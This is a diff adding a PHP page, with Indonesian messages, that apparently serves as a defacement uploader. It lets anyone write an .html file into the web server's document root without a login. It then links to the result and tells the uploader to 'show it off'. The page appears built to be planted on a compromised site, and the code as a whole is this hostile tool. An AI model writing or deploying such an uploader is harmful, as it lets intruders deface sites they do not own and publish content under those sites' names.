@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>U P P LL O O AA DD EE RR</title>
+    <style>
+        html, body {
+            background-color: #000;
+            color: #fff;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        #FileSel {
+            display: none;
+        }
+
+        .custom-file-label::after {
+            content: "Pilih File";
+        }
+
+        .btn {
+            margin-top: 10px;
+            background-color: #fff;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <form method="post" enctype="multipart/form-data">
+        <div>
+            <input id="previews" class="form-control" readonly="readonly" />
+            <label class="btn" for="FileSel">Pilih File</label>
+            <input type="file" name="randsx" id="FileSel">
+        </div>
+        <button type="submit" name="upload" class="btn">Upload</button>
+    </form>
+</div>
+
+<script>
+    document.getElementById('FileSel').onchange = function () {
+        document.getElementById('previews').value = this.value;
+    };
+</script>
+
+<?php
+    if (isset($_POST['upload'])) {
+        $server = $_SERVER['DOCUMENT_ROOT'];
+        $namaFile = $_FILES['randsx']['name'];
+        $getcwd = "$server/$namaFile";
+        $typeExt = pathinfo($namaFile, PATHINFO_EXTENSION);
+        $allowedExtensions = array('html');
+
+        if ($namaFile !== '') {
+            if (is_writable($server)) {
+                if (in_array($typeExt, $allowedExtensions)) {
+                    if ($namaFile !== 'index') {
+                        $finfo = finfo_open(FILEINFO_MIME_TYPE);
+                        $fileMimeType = finfo_file($finfo, $_FILES['randsx']['tmp_name']);
+                        finfo_close($finfo);
+                        $allowedMimeTypes = array('text/html', 'application/xhtml+xml');
+
+                        if (in_array($fileMimeType, $allowedMimeTypes)) {
+                            if (@copy($_FILES['randsx']['tmp_name'], $getcwd)) {
+                                $akses = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+                                echo '<script>alert("Berhasil. Silahkan pamer.");</script>';
+                                echo '<a href="' . $akses . $namaFile . '" target="_blank">Hasil Upload</a>';
+                            } else {
+                                echo '<script>alert("Gagal Upload. Coba lagi.");</script>';
+                            }
+                        } else {
+                            echo '<script>alert("Tipe file yang diunggah tidak diperbolehkan.");</script>';
+                        }
+                    } else {
+                        echo '<script>alert("Mau nikung? Mana bisa goblok!");</script>';
+                    }
+                } else {
+                    echo '<script>alert("Ekstensi file harus .html!");</script>';
+                }
+            } else {
+                echo '<script>alert("Gagal. Server tidak mendukung.");</script>';
+            }
+        } else {
+            echo '<script>alert("Pilih file terlebih dahulu.");</script>';
+        }
+    }
+?>
+</body>
+</html>
